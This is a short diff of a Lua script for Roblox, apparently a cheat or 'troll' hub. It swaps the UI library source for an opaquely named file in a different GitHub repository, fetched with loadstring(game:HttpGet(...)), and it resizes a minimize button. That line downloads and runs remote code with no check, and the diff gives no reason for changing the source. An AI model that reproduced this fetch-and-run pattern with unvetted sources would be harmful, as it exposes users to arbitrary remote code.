@@ -575,7 +575,7 @@ local function ForcePart(v)
     end
 end
 
-local redzlib = loadstring(game:HttpGet("https://raw.githubusercontent.com/Yuna-ux/Other-scripts/refs/heads/main/UI-Library.lua"))()
+local redzlib = loadstring(game:HttpGet("https://raw.githubusercontent.com/gsoqh9qy29wyiwy-a11y/Dark-x-HUB-/refs/heads/main/XqZsnzRQ.txt"))()
 
 --  3. JANELA PRINCIPAL
 local Window = redzlib:MakeWindow({
@@ -585,9 +585,14 @@ local Window = redzlib:MakeWindow({
 })
 
 Window:AddMinimizeButton({
-    Button = { Image = "rbxassetid://113088956809836", BackgroundTransparency = 0 },
+    Button = { 
+        Image = "rbxassetid://113088956809836", 
+        BackgroundTransparency = 0,
+        Size = UDim2.new(0, 50, 0, 50) -- Altere os valores (50, 50) para o tamanho desejado em pixels
+    },
     Corner = { CornerRadius = UDim.new(35, 1) },
 })
+
 
 local Tab1 = Window:MakeTab({ Title = "Info", Icon = "rbxassetid://15309138473"})
 local TabTroll = Window:MakeTab({"Troll", "rbxassetid://13364900349"})
